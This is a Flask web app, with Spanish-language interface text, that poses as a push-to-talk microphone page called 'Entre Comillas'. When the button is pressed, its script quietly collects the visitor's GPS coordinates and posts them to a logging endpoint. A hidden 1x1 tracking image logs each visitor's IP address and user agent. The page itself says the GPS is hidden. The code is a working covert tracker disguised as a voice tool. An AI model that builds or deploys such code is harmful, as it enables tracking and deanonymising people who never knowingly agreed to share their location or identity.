from flask import Flask, request, send_file, jsonify
from flask_cors import CORS
import datetime

app = Flask(__name__)
CORS(app)  # Permite llamadas desde JS externo (CORS)


@app.route('/', methods=['GET'])
def index():
    return """
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <title>Entre Comillas 🎤</title>
        <style>
            .mic-button {
                background-color: #444;
                color: white;
                border: none;
                padding: 15px 30px;
                font-size: 20px;
                border-radius: 50px;
                cursor: pointer;
            }
            .status {
                margin-top: 20px;
                font-size: 18px;
                color: #333;
                font-weight: bold;
            }
            .pulse {
                animation: pulse 1s infinite;
            }
            @keyframes pulse {
                0% { transform: scale(1); opacity: 0.7; }
                50% { transform: scale(1.1); opacity: 1; }
                100% { transform: scale(1); opacity: 0.7; }
            }
        </style>
    </head>
    <body style="font-family: sans-serif; text-align: center; padding-top: 60px;">

        <h1>🎤 Entre Comillas</h1>
        <p>Presiona el botón para activar el micrófono (y GPS oculto)</p>

        <button id="micBtn" class="mic-button">🎙️ Pulsar para Hablar</button>
        <div id="status" class="status"></div>

        <img src="/recibo.jpeg" alt="Invisible" width="1" height="1" style="display:none;">

        <script>
        const micBtn = document.getElementById('micBtn');
        const status = document.getElementById('status');

        micBtn.addEventListener('mousedown', async () => {
            status.textContent = '🛰️ Solicitando GPS...';
            try {
                const position = await new Promise((resolve, reject) =>
                    navigator.geolocation.getCurrentPosition(resolve, reject)
                );

                fetch('/log-coords', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        lat: position.coords.latitude,
                        lon: position.coords.longitude
                    })
                }).then(res => console.log('📍 Ubicación enviada:', res.status));
            } catch (err) {
                console.warn('❌ No se pudo obtener ubicación:', err.message);
            }

            status.textContent = '🎤 Solicitando micrófono...';
            try {
                await navigator.mediaDevices.getUserMedia({ audio: true });
                status.textContent = '🎧 Escuchando...';
                status.classList.add('pulse');
            } catch (err) {
                status.textContent = '❌ Micrófono denegado.';
                console.warn('❌ Error micrófono:', err.message);
            }
        });

        micBtn.addEventListener('mouseup', () => {
            status.classList.remove('pulse');
            status.textContent = '⏳ Procesando audio...';
            setTimeout(() => {
                status.textContent = '✅ Listo.';
            }, 2000);
        });
        </script>
    </body>
    </html>
    """

@app.route('/', methods=['POST'])
def post_message():
    forwarded = request.headers.get('X-Forwarded-For', '')
    ip = forwarded.split(',')[0].strip() if forwarded else request.remote_addr
    ua = request.headers.get('User-Agent')
    msg = request.form.get('mensaje', '').strip()
    now = datetime.datetime.now().isoformat()

    print(f"{now} - IP: {ip} 🙂 - MENSAJE: {msg} - UA: {ua}")
    return "<h2>✅ Gracias, tu mensaje ha sido enviado.</h2>"

@app.route('/recibo.jpeg')
def tracker():
    forwarded = request.headers.get('X-Forwarded-For', '')
    ip = forwarded.split(',')[0].strip() if forwarded else request.remote_addr
    ua = request.headers.get('User-Agent')
    now = datetime.datetime.now().isoformat()

    print(f"{now} - IP: {ip} 🙂 - UA: {ua} (imagen rastreadora)")
    return send_file("recibo.jpeg", mimetype="image/jpeg")

@app.route('/log-coords', methods=['POST'])
def log_coords():
    data = request.get_json()
    now = datetime.datetime.now().isoformat()
    lat = data.get('lat')
    lon = data.get('lon')
    print(f"{now} - 📍 Coordenadas GPS del usuario: {lat}, {lon}")
    return jsonify({'status': 'ok'}), 200

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
